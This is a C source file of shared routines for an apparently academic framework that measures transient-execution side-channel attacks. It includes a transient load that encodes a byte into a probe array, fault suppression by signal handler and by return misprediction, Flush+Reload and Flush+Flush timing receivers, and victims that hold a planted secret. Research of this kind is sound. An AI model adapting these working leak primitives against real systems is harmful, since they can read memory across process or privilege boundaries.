// implementation of common functionality not specific to a particular attack

#include "common.h"

#include <sched.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/user.h>
#include <time.h>
#include <ucontext.h>

jmp_buf try_setjmp_buf;
// we start outside of a try_begin block
volatile sig_atomic_t try_entered = 0;

int main(void) {
#if defined(VICTIM_LOAD) || defined(VICTIM_STORE)
    // if there is a victim, fork
    pid_t p = fork();
    ASSERT(p != -1);
    if (p) {
        // parent executes the attacker
        bind_to_cpu(CPU_ATTACKER);
        // give the victim 1ms to warm up
        usleep(1000);
        attacker();
        // terminate the victim
        ASSERT(kill(p, SIGTERM) == 0);
    } else {
        // child executes the victim
        bind_to_cpu(CPU_VICTIM);
        victim();
    }
#else
    // if there is no victim, simply execute the attacker
    bind_to_cpu(CPU_ATTACKER);
    attacker();
#endif
}

void mem_flush(const volatile void *ptr) {
    // clflush is only ordered by mfence
    __builtin_ia32_mfence();
    __builtin_ia32_clflush((const void *)ptr);
    __builtin_ia32_mfence();
}

void mem_access(const volatile void *ptr) {
    *(const volatile uintptr_t *)ptr;
}

NAKED void probe_access_transient(UNUSED const volatile void *target,
        UNUSED const page_t *probe_arr) {
    asm("call setret;"
        "attack:"
        // rax = (uint8_t)*(uintptr_t *)target
        "mov (%rdi), %rax;"
        "movzbl %al, %eax;"
        // access probe_arr[rax]
        "shl $12, %rax;"
        "mov (%rsi, %rax), %rax;"
        "setret:"
        // rax = &doret
        "lea doret(%rip), %rax;"
        // execute some instructions depending on rax
        // to introduce data dependencies
        ".rept 64;"
        "imul $1, %rax, %rax;"
        ".endr;"
        // overwrite return address and return
        // return to attack will be predicted
        // real return is to doret
        "mov %rax, (%rsp);"
        "ret;"
        "doret: ret;");
}

NAKED void probe_access(UNUSED const volatile void *target, UNUSED const page_t *probe_arr) {
    asm("attack:"
        // rax = (uint8_t)*(uintptr_t *)target
        "mov (%rdi), %rax;"
        "movzbl %al, %eax;"
        // access probe_arr[rax]
        "shl $12, %rax;"
        "mov (%rsi, %rax), %rax;"
        "ret;");
}

cyclecount_t cyclecount(void) {
    uint32_t unused;
    // wait for preceding loads and stores to become globally visible
    __builtin_ia32_mfence();
    // wait until all preceding instructions have executed, then read tsc
    uint64_t t = __builtin_ia32_rdtscp(&unused);
    // no later instruction begins execution before lfence completes
    __builtin_ia32_lfence();
    return t;
}

cyclecount_t cyclecount_access(const volatile void *ptr) {
    // fences as explained in the thesis
    uint32_t unused;
    __builtin_ia32_mfence();
    cyclecount_t start = __builtin_ia32_rdtscp(&unused);
    __builtin_ia32_lfence();
    mem_access(ptr);
    cyclecount_t end = __builtin_ia32_rdtscp(&unused);
    __builtin_ia32_lfence();
    return end - start;
}

cyclecount_t cyclecount_access_flush(const volatile void *ptr) {
    cyclecount_t time = cyclecount_access(ptr);
    mem_flush(ptr);
    return time;
}

cyclecount_t cyclecount_flush(const volatile void *ptr) {
    // fences as explained in the thesis
    uint32_t unused;
    __builtin_ia32_mfence();
    cyclecount_t start = __builtin_ia32_rdtscp(&unused);
    __builtin_ia32_mfence();
    __builtin_ia32_clflush((const void *)ptr);
    __builtin_ia32_mfence();
    cyclecount_t end = __builtin_ia32_rdtsc();
    __builtin_ia32_lfence();
    return end - start;
}

void bind_to_cpu(int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    ASSERT(sched_setaffinity(0, sizeof set, &set) == 0);
}

uint64_t get_wall_time_ns(void) {
    struct timespec ts;
    ASSERT(clock_gettime(CLOCK_MONOTONIC, &ts) == 0);
    ASSERT(ts.tv_sec > 0 && ts.tv_nsec > 0);
    return (uint64_t)ts.tv_nsec + (uint64_t)ts.tv_sec * 1000000000ull;
}

void try_end(void) {
    // change try_entered status from 1 to 0
    ASSERT(try_entered == 1);
    try_entered = 0;
}

void try_abort(void) {
    mem_access((void *)0x1000);
}

static void segv_handler(UNUSED int sig) {
    // signal handler called when a fault occurs

    // change try_entered status from 1 to 0
    ASSERT(try_entered == 1);
    try_entered = 0;

    // restore the execution state saved by try_begin
    longjmp(try_setjmp_buf, 1);
}

__attribute__((constructor)) void segv_handler_set(void) {
    // register signal handler when the process starts
    struct sigaction act = {0};
    act.sa_handler = segv_handler;
    act.sa_flags = (int)SA_NODEFER;
    ASSERT(sigaction(SIGSEGV, &act, NULL) == 0);
}

page_t *mmap_pages(size_t count) {
    void *page = mmap(NULL,
            PAGE_SIZE * count,
            PROT_READ | PROT_WRITE,
            MAP_PRIVATE | MAP_ANONYMOUS,
            -1,
            0);
    ASSERT(page != MAP_FAILED);
    return page;
}

void mmap_evict(page_t *pages, size_t count) {
    // use madvise with DONTNEED to page-out pages
    ASSERT(madvise(pages, count * PAGE_SIZE, MADV_DONTNEED) == 0);

    // delay for a bit to make sure the page was actually evicted
    for (size_t i = 0; i < 4000; i++)
        asm(".rept 10;"
            "imul $1, %rax, %rax;"
            ".endr;");
}

void transmit_prepare(transmit_t *transmit) {
    // reset hit counts
    memset(transmit->hits, 0, sizeof transmit->hits);

    // allocate probe array
    transmit->probe_arr = mmap_pages(256);
    memset(transmit->probe_arr, 0, 256 * PAGE_SIZE);

    // reset metrics
    transmit->cycles_leak = 0;
    transmit->cycles_decode = 0;
    transmit->timing_leak = false;
    transmit->start_time_ns = get_wall_time_ns();
    transmit->correct_transmissions = 0;
}

void leak_and_transmit(transmit_t *transmit, const volatile void *target) {
#if defined(FAULT_SIGNAL)
    if (try_begin()) {
        probe_access(target, transmit->probe_arr);
        try_abort();
    }

#elif defined(FAULT_TRANSIENT)
    probe_access_transient(target, transmit->probe_arr);

#else
    // perform access without fault handling, it's handled by attacker() in an attack-specific way
    probe_access(target, transmit->probe_arr);

#endif
}

void transmit_receive(transmit_t *transmit) {
    static size_t run = 0;
    run++;

    // start of decode timing
    transmit->cycles_decode -= cyclecount();

    for (size_t i = 0; i < 256; i++) {
        // perturb index to confuse prefetcher
        size_t k = (i + 5 * run) % 256;

        // check if latency reaches threshold
#if defined(CACHE_FR)
        if (cyclecount_access_flush(transmit->probe_arr + k) < THRESHOLD_FR)
#elif defined(CACHE_FF)
        if (cyclecount_flush(transmit->probe_arr + k) >= THRESHOLD_FF)
#else
        // abort if no cache side-channel attack is configured
        ASSERT(false);
#endif
            // record hits
            transmit->hits[k]++;
    }

    // end of decode timing
    transmit->cycles_decode += cyclecount();
}

void transmit_decode(transmit_t *transmit) {
    // determine byte with the highest number of hits
    size_t leaked_byte = 0;
    size_t max_hits = 0;
    for (size_t i = 0; i < 256; i++) {
        size_t hits = transmit->hits[i];

        if (i > 0 && hits >= max_hits) {
            leaked_byte = i;
            max_hits = hits;
        }
    }
    // reset hit counts
    memset(transmit->hits, 0, sizeof transmit->hits);

    // record whether byte was leaked correctly
    if (leaked_byte == (uint8_t)SECRET)
        transmit->correct_transmissions++;
}

void transmit_display(transmit_t *transmit) {
    // calculate metrics

    uint64_t end_time_ns = get_wall_time_ns();
    double total_time = (double)(end_time_ns - transmit->start_time_ns) / SAMPLE_COUNT / 1e9;

    double rate_hits = (double)transmit->correct_transmissions / SAMPLE_COUNT;

    double cycles_leak = (double)transmit->cycles_leak / COUNTS_PER_SAMPLE / SAMPLE_COUNT;
    double cycles_decode = (double)transmit->cycles_decode / COUNTS_PER_SAMPLE / SAMPLE_COUNT;

    // print metrics
    printf("%lg,%lg,%lg,%lg\n", rate_hits, cycles_leak, cycles_decode, total_time);
}

void transmit_leak_start(transmit_t *transmit) {
    ASSERT(!transmit->timing_leak);

    // start of leak timing
    transmit->cycles_leak -= cyclecount();
    transmit->timing_leak = true;
}

void transmit_leak_end(transmit_t *transmit) {
    ASSERT(transmit->timing_leak);

    // end of leak timing
    transmit->cycles_leak += cyclecount();
    transmit->timing_leak = false;
}

#if defined(VICTIM_LOAD)
void victim(void) {
    victim_load();
}
#elif defined(VICTIM_STORE)
void victim(void) {
    victim_store();
}
#endif

void victim_load(void) {
    // allocate page and store the secret there
    volatile uintptr_t *secret = (volatile void *)mmap_pages(1);
    *secret = SECRET;
    // load from the page in a loop
    for (;;) {
        mem_flush(secret);
        *secret;
    }
}

void victim_store(void) {
    // allocate page
    volatile uintptr_t *secret = (volatile void *)mmap_pages(1);
    // store secret in page in a loop
    for (;;) {
        *secret = SECRET;
        __builtin_ia32_mfence();
    }
}
